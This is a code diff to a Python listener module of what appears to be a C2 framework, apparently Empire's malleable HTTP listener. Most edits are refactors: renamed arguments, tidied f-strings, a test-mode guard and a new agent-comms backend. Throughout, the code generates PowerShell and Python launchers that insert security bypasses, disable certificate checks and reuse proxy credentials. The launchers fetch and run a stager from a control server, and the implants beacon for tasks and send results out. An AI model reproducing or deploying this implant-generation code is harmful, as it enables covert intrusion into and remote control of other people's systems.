@@ -119,11 +119,6 @@ class Listener:
                 "Required": False,
                 "Value": "default",
             },
-            "SlackURL": {
-                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
-                "Required": False,
-                "Value": "",
-            },
             "Cookie": {
                 "Description": "Custom Cookie Name",
                 "Required": False,
@@ -259,13 +254,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         stager=None,
         bypasses: list[str] | None = None,
     ):
@@ -292,25 +287,25 @@ class Listener:
         profile.stager.client.port = port
         profile.stager.client.path = profile.stager.client.random_uri()
 
-        if userAgent and userAgent.lower() != "default":
+        if user_agent and user_agent.lower() != "default":
             if (
-                userAgent.lower() == "none"
+                user_agent.lower() == "none"
                 and "User-Agent" in profile.stager.client.headers
             ):
                 profile.stager.client.headers.pop("User-Agent")
             else:
-                profile.stager.client.headers["User-Agent"] = userAgent
+                profile.stager.client.headers["User-Agent"] = user_agent
 
         if language == "powershell":
             launcherBase = '$ErrorActionPreference = "SilentlyContinue";'
 
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 launcherBase = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
             for bypass in bypasses:
                 launcherBase += bypass
 
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 launcherBase += (
                     "};[System.Net.ServicePointManager]::Expect100Continue=0;"
                 )
@@ -366,17 +361,17 @@ class Listener:
 
                 else:
                     launcherBase += (
-                        f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
+                        f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');"
                     )
                     launcherBase += "$wc.Proxy = $proxy;"
 
-                if proxyCreds and proxyCreds.lower() != "none":
-                    if proxyCreds.lower() == "default":
+                if proxy_creds and proxy_creds.lower() != "none":
+                    if proxy_creds.lower() == "default":
                         launcherBase += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         if len(username.split("\\")) > 1:
                             usr = username.split("\\")[1]
                             domain = username.split("\\")[0]
@@ -384,7 +379,7 @@ class Listener:
 
                         else:
                             usr = username.split("\\")[0]
-                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{password}');"
+                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}');"
 
                         launcherBase += "$wc.Proxy.Credentials = $netcred;"
 
@@ -398,14 +393,14 @@ class Listener:
                 if header.lower() == "host":
                     launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"
 
-                launcherBase += f'$wc.Headers.Add("{ header }","{ value }");'
+                launcherBase += f'$wc.Headers.Add("{header}","{value}");'
 
             # ==== SEND REQUEST ====
             if (
                 profile.stager.client.verb.lower() != "get"
                 or profile.stager.client.body
             ):
-                launcherBase += f"$data=$wc.UploadData($ser+$t,'{ profile.stager.client.verb }','{ profile.stager.client.body }');"
+                launcherBase += f"$data=$wc.UploadData($ser+$t,'{profile.stager.client.verb}','{profile.stager.client.body}');"
 
             else:
                 launcherBase += "$data=$wc.DownloadData($ser+$t);"
@@ -418,7 +413,7 @@ class Listener:
                 launcherBase += (
                     "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
                 )
-                launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{ profile.stager.server.output.terminator.arg }')"
+                launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{profile.stager.server.output.terminator.arg}')"
                 launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
                 launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
             elif (
@@ -459,7 +454,7 @@ class Listener:
                 launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
 
             # ==== SAFE CHECKS ====
-            if safeChecks and safeChecks.lower() == "true":
+            if safe_checks and safe_checks.lower() == "true":
                 launcherBase += listener_util.python_safe_checks()
 
             launcherBase += f"server='{host}'\n"
@@ -477,13 +472,13 @@ class Listener:
                         + proxy
                         + "'})\n"
                     )
-                if proxyCreds and proxyCreds != "none":
-                    if proxyCreds == "default":
+                if proxy_creds and proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy)\n"
                     else:
                         launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         launcherBase += (
                             "proxy_auth_handler.add_password(None,'"
                             + proxy
@@ -639,7 +634,7 @@ class Listener:
                     ]
                 )
                 stager = stager.replace(
-                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
+                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                 )
 
             comms_code = self.generate_comms(
@@ -758,7 +753,7 @@ class Listener:
             code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
             code = code.replace(
                 '$DefaultResponse = ""',
-                f'$DefaultResponse = "{ b64DefaultResponse }"',
+                f'$DefaultResponse = "{b64DefaultResponse}"',
             )
 
             if obfuscate:
@@ -782,15 +777,15 @@ class Listener:
             code = helpers.strip_python_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("delay=60", f"delay={ delay }")
-            code = code.replace("jitter=0.0", f"jitter={ jitter }")
+            code = code.replace("delay=60", f"delay={delay}")
+            code = code.replace("jitter=0.0", f"jitter={jitter}")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                f'profile = "{ profileStr }"',
+                f'profile = "{profileStr}"',
             )
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
-                f'defaultResponse = base64.b64decode("{ b64DefaultResponse }")',
+                f'defaultResponse = base64.b64decode("{b64DefaultResponse}")',
             )
 
             if obfuscate:
@@ -826,7 +821,7 @@ class Listener:
 
         if language.lower() == "powershell":
             # PowerShell
-            updateServers = f'$Script:ControlServers = @("{ host }");'
+            updateServers = f'$Script:ControlServers = @("{host}");'
             updateServers += "$Script:ServerIndex = 0;"
 
             # ==== HANDLE SSL ====
@@ -841,7 +836,7 @@ try {{
         # ==== BUILD ROUTING PACKET ====
         $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
         $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
-        { profile.get.client.metadata.generate_powershell("$RoutingPacket") }
+        {profile.get.client.metadata.generate_powershell("$RoutingPacket")}
 
         # ==== BUILD REQUEST ====
         $vWc = New-Object System.Net.WebClient;
@@ -873,14 +868,14 @@ try {{
             for parameter, value in profile.get.client.parameters.items():
                 getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                 first = False
-                getTask += f"$taskURI += '{ parameter }={ value }';"
+                getTask += f"$taskURI += '{parameter}={value}';"
             if (
                 profile.get.client.metadata.terminator.type
                 == malleable.Terminator.PARAMETER
             ):
                 getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                 first = False
-                getTask += f"$taskURI += '{ profile.get.client.metadata.terminator.arg }=' + $RoutingPacket;"
+                getTask += f"$taskURI += '{profile.get.client.metadata.terminator.arg}=' + $RoutingPacket;"
 
             if (
                 profile.get.client.metadata.terminator.type
@@ -890,12 +885,12 @@ try {{
 
             # ==== ADD HEADERS ====
             for header, value in profile.get.client.headers.items():
-                getTask += f"$vWc.Headers.Add('{ header }', '{ value }');"
+                getTask += f"$vWc.Headers.Add('{header}', '{value}');"
             if (
                 profile.get.client.metadata.terminator.type
                 == malleable.Terminator.HEADER
             ):
-                getTask += f"$vWc.Headers.Add('{ profile.get.client.metadata.terminator.arg }', $RoutingPacket);"
+                getTask += f"$vWc.Headers.Add('{profile.get.client.metadata.terminator.arg}', $RoutingPacket);"
 
             # ==== ADD BODY ====
             if (
@@ -904,7 +899,7 @@ try {{
             ):
                 getTask += "$body = $RoutingPacket;"
             else:
-                getTask += f"$body = '{ profile.get.client.body }';"
+                getTask += f"$body = '{profile.get.client.body}';"
 
             # ==== SEND REQUEST ====
             if (
@@ -913,13 +908,13 @@ try {{
                 or profile.get.client.metadata.terminator.type
                 == malleable.Terminator.PRINT
             ):
-                getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.get.client.verb }', [System.Text.Encoding]::Default.GetBytes('{ profile.get.client.body }'));"
+                getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{profile.get.client.verb}', [System.Text.Encoding]::Default.GetBytes('{profile.get.client.body}'));"
             else:
                 getTask += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
             # ==== EXTRACT RESULTS ====
             if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
-                getTask += f"$data = $vWc.responseHeaders.get('{ profile.get.server.output.terminator.arg }');"
+                getTask += f"$data = $vWc.responseHeaders.get('{profile.get.server.output.terminator.arg}');"
                 getTask += "Add-Type -AssemblyName System.Web; $data = [System.Web.HttpUtility]::UrlDecode($data);"
 
             elif (
@@ -993,14 +988,14 @@ $vWc.Proxy = $Script:Proxy;
             for parameter, value in profile.post.client.parameters.items():
                 sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                 first = False
-                sendMessage += f"$taskURI += '{ parameter }={ value }';"
+                sendMessage += f"$taskURI += '{parameter}={value}';"
             if (
                 profile.post.client.output.terminator.type
                 == malleable.Terminator.PARAMETER
             ):
                 sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                 first = False
-                sendMessage += f"$taskURI += '{ profile.post.client.output.terminator.arg }=' + $RoutingPacket;"
+                sendMessage += f"$taskURI += '{profile.post.client.output.terminator.arg}=' + $RoutingPacket;"
 
             if (
                 profile.post.client.output.terminator.type
@@ -1010,19 +1005,19 @@ $vWc.Proxy = $Script:Proxy;
 
             # ==== ADD HEADERS ====
             for header, value in profile.post.client.headers.items():
-                sendMessage += f"$vWc.Headers.Add('{ header }', '{ value }');"
+                sendMessage += f"$vWc.Headers.Add('{header}', '{value}');"
 
             if (
                 profile.post.client.output.terminator.type
                 == malleable.Terminator.HEADER
             ):
-                sendMessage += f"$vWc.Headers.Add('{ profile.post.client.output.terminator.arg }', $RoutingPacket);"
+                sendMessage += f"$vWc.Headers.Add('{profile.post.client.output.terminator.arg}', $RoutingPacket);"
 
             # ==== ADD BODY ====
             if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                 sendMessage += "$body = $RoutingPacket;"
             else:
-                sendMessage += f"$body = '{ profile.post.client.body }';"
+                sendMessage += f"$body = '{profile.post.client.body}';"
 
             # ==== SEND REQUEST ====
             sendMessage += "try {"
@@ -1032,7 +1027,7 @@ $vWc.Proxy = $Script:Proxy;
                 or profile.post.client.output.terminator.type
                 == malleable.Terminator.PRINT
             ):
-                sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.post.client.verb.upper() }', [System.Text.Encoding]::Default.GetBytes($body));"
+                sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{profile.post.client.verb.upper()}', [System.Text.Encoding]::Default.GetBytes($body));"
             else:
                 sendMessage += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
@@ -1054,35 +1049,35 @@ import sys
 
 
 class ExtendedPacketHandler(PacketHandler):
-def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
-    super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
-    self.headers = headers
-    self.taskURIs = taskURIs
-    self.server = server
+    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
+        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
+        self.headers = headers
+        self.taskURIs = taskURIs
+        self.server = server
 
-def post_message(self, uri, data):
-    return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()
+    def post_message(self, uri, data):
+        return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()
 
-def send_results_for_child(self, received_data):
-    self.headers['Cookie'] = "session=%s" % (received_data[1:])
-    taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
-    requestUri = self.server + taskURI
-    response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
-    return response
+    def send_results_for_child(self, received_data):
+        self.headers['Cookie'] = "session=%s" % (received_data[1:])
+        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
+        requestUri = self.server + taskURI
+        response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
+        return response
 
-def send_get_tasking_for_child(self, received_data):
-    decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-    taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
-    requestUri = self.server + taskURI
-    response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
-    return response
+    def send_get_tasking_for_child(self, received_data):
+        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+        taskUri = random.sample({profile.post.client.uris!s}, 1)[0]
+        requestUri = self.server + taskURI
+        response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
+        return response
 
-def send_staging_for_child(self, received_data, hop_name):
-    postURI = self.server + "/login/process.php"
-    self.headers['Hop-Name'] = hop_name
-    decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-    response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
-    return response
+    def send_staging_for_child(self, received_data, hop_name):
+        postURI = self.server + "/login/process.php"
+        self.headers['Hop-Name'] = hop_name
+        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
+        response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
+        return response
 """
             sendMessage += "    def send_message(self, packets=None):\n"
             sendMessage += "        vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
@@ -1323,6 +1318,11 @@ def send_staging_for_child(self, received_data, hop_name):
         log = logging.getLogger("werkzeug")
         log.setLevel(logging.ERROR)
 
+        if os.environ.get("TEST_MODE"):
+            # Let's not start the server if we're running tests.
+            while True:
+                time.sleep(1)
+
         # initialize flask server
         app = Flask(__name__, template_folder=self.template_dir)
         self.app = app
@@ -1398,7 +1398,7 @@ def send_staging_for_child(self, received_data, hop_name):
                 else:
                     agentInfo = implementation.extract_client(malleableRequest)
                 if agentInfo:
-                    dataResults = self.mainMenu.agents.handle_agent_data(
+                    dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                         stagingKey, agentInfo, listenerOptions, clientIP
                     )
                     if not dataResults or len(dataResults) <= 0:
@@ -1462,9 +1462,9 @@ def send_staging_for_child(self, received_data, hop_name):
                                 sessionID = (
                                     results.split(b" ")[1].strip().decode("UTF-8")
                                 )
-                                sessionKey = self.mainMenu.agents.agents[sessionID][
-                                    "sessionKey"
-                                ]
+                                sessionKey = self.mainMenu.agentcommsv2.agents[
+                                    sessionID
+                                ]["sessionKey"]
 
                                 # log event
                                 message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
@@ -1535,7 +1535,12 @@ def send_staging_for_child(self, received_data, hop_name):
                                 # build malleable response with agent
                                 # note: stage1 comms are hard coded, can't use malleable here.
                                 return Response(
-                                    encryptedAgent,
+                                    packets.build_routing_packet(
+                                        stagingKey,
+                                        sessionID,
+                                        language,
+                                        encData=encryptedAgent,
+                                    ),
                                     200,
                                     implementation.server.headers,
                                 )
